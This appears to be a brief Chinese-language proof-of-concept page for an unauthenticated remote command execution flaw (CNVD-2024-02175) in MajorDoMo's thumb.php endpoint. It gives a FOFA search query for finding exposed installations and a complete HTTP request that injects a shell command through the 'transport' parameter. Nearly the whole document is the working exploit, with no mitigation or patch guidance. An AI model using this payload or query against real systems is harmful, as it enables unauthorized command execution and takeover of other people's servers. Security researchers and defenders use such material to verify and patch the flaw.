## MajorDoMo-thumb.php未授权RCE漏洞复现(CNVD-2024-02175)

MajorDoMo /modules/thumb/thumb.php接口处存在远程命令执行漏洞，未经身份验证的攻击者可利用此漏洞执行任意指令，获取服务器权限。

## fofa
```
app="MajordomoSL"
```

## poc
```
GET /modules/thumb/thumb.php?url=cnRzcDovL2EK&debug=1&transport=%7C%7C+%28echo+%27%5BS%5D%27%3B+id%3B+echo+%27%5BE%5D%27%29%23%3B HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Linux; Android 11; motorola edge 20 fusion) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.61 Mobile Safari/537.36
Accept-Charset: utf-8
Accept-Encoding: gzip, deflate
Connection: close
```
![image](https://github.com/wy876/POC/assets/139549762/89f477a7-2e73-4a27-863b-c3ba1fd701e6)
